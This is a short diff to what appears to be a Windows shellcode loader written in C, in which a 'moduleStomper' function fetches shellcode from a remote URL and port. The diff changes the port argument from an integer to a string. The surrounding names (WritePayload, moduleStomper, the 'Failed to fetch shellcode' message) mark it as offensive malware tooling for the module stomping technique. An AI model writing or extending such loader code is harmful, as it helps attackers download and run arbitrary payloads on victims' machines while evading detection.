@@ -26,8 +26,9 @@ BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayloadSize) 
 void moduleStomper(LPCWSTR url, LPCWSTR file) {
     unsigned char* payload = NULL;
     DWORD size = 0;
+    LPCWSTR port = L"8000";
 
-    int result = fetchCode(url, file, 8000, &payload, &size);
+    int result = fetchCode(url, file, port, &payload, &size);
     if (result != 0) {
         printf("[-] Failed to fetch shellcode with error code %d\n", result);
         return;
